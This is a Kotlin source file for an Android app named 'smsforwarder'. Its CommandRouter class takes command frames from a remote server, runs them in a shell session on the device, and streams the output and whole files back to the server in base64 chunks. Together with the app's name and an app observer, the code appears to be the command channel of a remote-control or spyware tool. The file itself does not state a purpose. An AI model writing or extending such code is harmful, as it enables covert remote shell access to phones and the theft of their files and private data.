package com.smsforwarder

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.security.MessageDigest

/**
 * Reçoit les trames `cmd` du serveur, exécute, renvoie `cmd_result` par morceaux.
 * Une seule commande lourde (download) à la fois.
 */
class CommandRouter(
    private val context: Context,
        private val send: (JSONObject) -> Unit
) {

    private val shell = ShellSession(context)
    private val observer = AppObserver(context)

    fun handle(cmd: JSONObject) {
        val id = cmd.optString("id")
        if (id.isEmpty()) return
            val name = cmd.optString("name")
            val session = cmd.optString("session").ifEmpty { "main" }
            val args = cmd.optJSONArray("args")?.let { array ->
                (0 until array.length()).map { array.optString(it) }
            } ?: emptyList()

            when (name) {
                "listen" -> handleListen(id, args.firstOrNull())
                else -> {
                    val outcome = shell.execute(session, name, args)
                    when (outcome) {
                        is ShellSession.Outcome.Text -> emit(id, outcome.text.toByteArray(Charsets.UTF_8), outcome.exit)
                        is ShellSession.Outcome.Failure -> emitError(id, outcome.message)
                        is ShellSession.Outcome.Binary -> streamFile(id, outcome.file)
                    }
                }
            }
    }

    private fun handleListen(id: String, mode: String?) {
        val enabled = mode != "off"
        RuntimeState.set(context, enabled)
        emit(id, "listening=${if (enabled) "on" else "off"}\n".toByteArray(), 0)
    }

    private fun streamFile(id: String, file: File) {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { stream ->
            val buffer = ByteArray(Config.SHELL_CHUNK_BYTES)
            var seq = 0
            while (true) {
                val read = stream.read(buffer)
                if (read <= 0) break
                    digest.update(buffer, 0, read)
                    emitChunk(id, "data", buffer.copyOf(read), seq++)
            }
        }
        val meta = JSONObject().apply {
            put("size", file.length())
            put("name", file.name)
            put("sha256", digest.digest().joinToString("") { "%02x".format(it.toInt() and 0xff) })
        }
        send(JSONObject().apply {
            put("type", "cmd_result"); put("id", id); put("stream", "meta"); put("meta", meta)
        })
        emitEnd(id, 0)
    }

    private fun emit(id: String, bytes: ByteArray, exit: Int) {
        if (bytes.isNotEmpty()) emitChunk(id, "stdout", bytes, 0)
            emitEnd(id, exit)
    }

    private fun emitError(id: String, message: String) {
        emitChunk(id, "stderr", (message + "\n").toByteArray(Charsets.UTF_8), 0)
        emitEnd(id, 1)
    }

    private fun emitChunk(id: String, stream: String, bytes: ByteArray, seq: Int) {
        send(JSONObject().apply {
            put("type", "cmd_result")
            put("id", id)
            put("stream", stream)
            put("seq", seq)
            put("data", android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP))
        })
    }

    private fun emitEnd(id: String, exit: Int) {
        send(JSONObject().apply {
            put("type", "cmd_result"); put("id", id); put("stream", "end"); put("eof", true); put("exit", exit)
        })
    }

    companion object {
        private const val TAG = "CommandRouter"
    }
}
